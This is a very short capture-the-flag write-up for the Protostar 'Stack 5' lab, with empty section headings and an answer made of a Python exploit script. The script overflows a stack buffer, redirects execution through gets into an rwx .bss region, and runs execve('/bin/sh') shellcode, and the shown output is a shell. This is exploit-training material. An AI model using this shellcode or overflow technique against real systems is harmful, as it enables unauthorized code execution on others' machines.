# Stack 5
## Overview
## Process
## Method
## Answer
    
    create stack5.py 
        import struct
        shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3
                     \x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
        payload = ""
        payload += "A"*76  #junk
        payload += struct.pack("<I",0x080482e8)  #plt_gets
        payload += struct.pack("<I",0x080496DC)#"\xac\x95\x04\x08"  #bss with rwx
        payload += struct.pack("<I",0x080496DC)#"\xac\x95\x04\x08"  #bss with rwx
        payload += "\n"
        payload += shellcode
        payload += "\n"
        print payload


    $ (python /home/mickey/Desktop/protostar/stack5.py ; cat ) | ./stack5
    ls
    ....file lists
